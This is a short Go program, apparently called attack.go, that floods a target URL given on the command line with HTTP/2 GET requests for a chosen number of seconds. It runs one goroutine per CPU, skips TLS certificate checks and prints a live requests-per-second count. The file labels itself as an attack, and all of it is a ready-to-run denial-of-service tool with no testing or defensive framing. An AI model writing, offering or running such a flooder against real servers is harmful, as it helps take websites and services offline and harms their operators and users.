package main

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: go run attack.go <target> <duration_secs>")
		return
	}

	target := os.Args[1]
	durationSec, _ := strconv.Atoi(os.Args[2])
	end := time.Now().Add(time.Duration(durationSec) * time.Second)

	threads := runtime.NumCPU()
	fmt.Printf("Launching attack on %s for %ds with %d goroutines...\n", target, durationSec, threads)

	var wg sync.WaitGroup
	var mu sync.Mutex
	totalRequests := 0

	// Start goroutines for the attack
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			attackLoop(target, end, &mu, &totalRequests)
		}()
	}

	// Print live RPS every second
	go func() {
		for time.Now().Before(end) {
			time.Sleep(1 * time.Second)
			mu.Lock()
			fmt.Printf("Requests per second: %d\n", totalRequests)
			totalRequests = 0
			mu.Unlock()
		}
	}()

	wg.Wait()
}

func attackLoop(target string, end time.Time, mu *sync.Mutex, totalRequests *int) {
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		AllowHTTP: false,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	for time.Now().Before(end) {
		req, _ := http.NewRequestWithContext(context.Background(), "GET", target, nil)
		_, _ = client.Do(req)

		mu.Lock()
		*totalRequests++
		mu.Unlock()
	}
}
